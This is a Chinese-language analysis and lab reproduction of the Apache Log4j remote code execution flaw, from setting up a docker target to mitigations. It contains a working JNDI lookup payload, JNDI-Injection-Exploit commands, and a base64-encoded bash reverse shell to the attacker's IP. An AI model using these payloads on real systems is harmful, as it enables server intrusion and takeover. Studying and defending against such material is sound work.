Apache Log4j远程代码执行漏洞分析与复现利用

0x1：漏洞描述
2021年12月9日，Apache Log4j 的远程代码执行漏洞细节被公开，大量的业务框架都使用了该组件。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。该漏洞一旦被攻击者利用会造成严重危害。经过快速分析和确认，该漏洞影响范围极其广泛，危害极其严重。
Apache Log4j2是一款优秀的Java日志框架。由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特别构造的数据请求包，可在目标服务器上执行任意代码，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经验证Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。

0x2：受影响版本
Apache Log4j 2.x <= 2.15.0-rc2

供应链影响范围，已知受影响应用及组件：
Apache Solr、Apache Flink、Apache Druid、srping-boot-strater-log4j2、dubbo、Flume、Redis

0x3：漏洞级别
高危、远程代码执行，目前漏洞rce-exp已网上公开，找到受影响的参数，提交
“${jndi:ldap://****. dnslog.cn/exp}”进行测试。

0x4：漏洞环境搭建与复现
漏洞靶场搭建，网上有搭建好的docker环境漏洞靶场，需要先安装docker环境

docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln
![image](https://github.com/rabbitsafe/Apache-Log4j_RCE/blob/main/1.png) 
docker run -it -d -p 8888:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln 
docker exec -it log4j_vuln_container /bin/bash
/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh

执行完以上操作，可以访问存在Apache Log4j远程代码执行漏洞，这里192.168.32.168的ip地址是我安装了docker虚拟机的ip地址，url如下：
http://192.168.32.168:8888/webstudy/hello-fengxuan

由于该漏洞是jndi加载ldap协议就可以触发漏洞，使用
JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar进行ldap协议监听，并提前输入好需要执行的命令，命令如下：
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch /tmp/88888888888" -A 192.168.32.1
-C后面添加的是需要执行的命令
-A后面是监听的IP地址
 
只要根据JDK的版本，提交不同的ldap
如果JDK 是1.7，可以使用
ldap://192.168.32.1:1389/sjrchi
如果JDK 是1.8，可以使用
ldap://192.168.32.1:1389/fojm7q

通过BurpSuite提交数据包，由于url只接受需POST数据，受影响的参数是c，在验证的时候，一定要加入
Content-Type: application/x-www-form-urlencoded;
 
已经接收到ldap协议数据
 
如果Apache Log4j远程代码执行漏洞成功，就会执行命令touch /tmp/88888888888，在tmp目录下建一个88888888888文件

进入docker环境漏洞靶场，查看命令是否执行成功，文件成功被创建
docker exec -it log4j_vuln_container /bin/bash
 

通过修改-C里面的命令内容，获取shell
对bash -i >& /dev/tcp/192.168.32.1/22 0>&1命令进行加密处理
 
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMyLjEvMjIgMD4mMQ==}|{base64,-d}|{bash,-i}" -A 192.168.32.1
 
 
成功获取shell
 

0x5：漏洞修复建议
1、升级Apache Log4j2组件到最新版本（log4j-2.15.0-rc2）：
https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2
2、其他缓解措施：
（1）禁止没有必要的业务访问外网
（2）修改jvm参数 -Dlog4j2.formatMsgNoLookups=true
（3）修改配置log4j2.formatMsgNoLookups=True
（4）将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true
（5）禁止使用Apache Log4j2服务器外连，升级JDK 11.0.1 8u191 7u201 6u211或更高版本。
